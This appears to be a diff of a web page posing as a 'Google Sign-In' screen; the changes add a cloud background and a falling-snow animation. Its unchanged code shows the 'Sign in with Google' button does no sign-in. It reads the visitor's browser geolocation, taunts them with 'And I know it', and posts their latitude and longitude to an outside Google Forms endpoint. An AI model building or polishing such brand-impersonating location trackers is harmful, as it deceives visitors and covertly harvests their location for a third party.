@@ -9,8 +9,11 @@
       font-family: Arial, sans-serif;
       margin: 20px;
       padding: 20px;
-      background-color: #f4f4f9;
+      background: url('https://i.imgur.com/N1X5Kqg.jpg') no-repeat center center fixed; /* Replace with any cloud image */
+      background-size: cover;
       color: #333;
+      position: relative;
+      overflow: hidden;
     }
     h1 {
       background: linear-gradient(to right, #DB4437, #F4B400, #0F9D58);
@@ -36,20 +39,47 @@
     .green-text {
       color: #34A853;
     }
+    /* Snow Effect */
+    .snow {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      pointer-events: none;
+    }
+    .snowflake {
+      position: absolute;
+      top: -10px;
+      width: 8px;
+      height: 8px;
+      background: white;
+      border-radius: 50%;
+      opacity: 0.8;
+      animation: fall linear infinite;
+    }
+    @keyframes fall {
+      to {
+        transform: translateY(100vh);
+      }
+    }
   </style>
 </head>
 <body>
   <h1>Google Sign-In</h1>
-  <p>Click the button below to sign in:</p>  <!-- FIXED Problem 1 -->
+  <p>Click the button below to sign in:</p>
   <button onclick="getLocation()">Sign in with Google</button>
   <p id="output"></p>
+
+  <!-- Snow container -->
+  <div class="snow"></div>
 
   <script>
     function sendLocationToGoogleForms(latitude, longitude) {
       const formURL = "https://docs.google.com/forms/d/e/1FAIpQLSdxTw7tsM-Ywv2BWDQ5QtOpOoqeLC_9vAogr7RDDCr4OnAR-w/formResponse";
       const formData = new FormData();
-      formData.append("entry.1622877945", latitude);  // Use actual form entry ID
-      formData.append("entry.603826075", longitude);  // Use actual form entry ID
+      formData.append("entry.1622877945", latitude);  
+      formData.append("entry.603826075", longitude);  
 
       fetch(formURL, {
         method: "POST",
@@ -67,9 +97,8 @@
           (position) => {
             const latitude = position.coords.latitude;
             const longitude = position.coords.longitude;
-            output.innerHTML = `Your Location: Latitude ${latitude}, Longitude ${longitude}<br><span class="green-text">And I know it 🤣</span>`;  // FIXED Problem 2
+            output.innerHTML = `Your Location: Latitude ${latitude}, Longitude ${longitude}<br><span class="green-text">And I know it 🤣</span>`;
 
-            // Send location to Google Forms
             sendLocationToGoogleForms(latitude, longitude);
           },
           (error) => {
@@ -92,6 +121,21 @@
         output.textContent = "Geolocation is not supported by your browser.";
       }
     }
+
+    // Snow Effect Generator
+    function createSnowflakes() {
+      const snowContainer = document.querySelector('.snow');
+      for (let i = 0; i < 50; i++) { // Adjust number of snowflakes
+        let snowflake = document.createElement('div');
+        snowflake.classList.add('snowflake');
+        snowflake.style.left = Math.random() * 100 + 'vw';
+        snowflake.style.animationDuration = (Math.random() * 3 + 2) + 's'; 
+        snowflake.style.animationDelay = Math.random() * 5 + 's';
+        snowContainer.appendChild(snowflake);
+      }
+    }
+
+    createSnowflakes();
   </script>
 </body>
 </html>
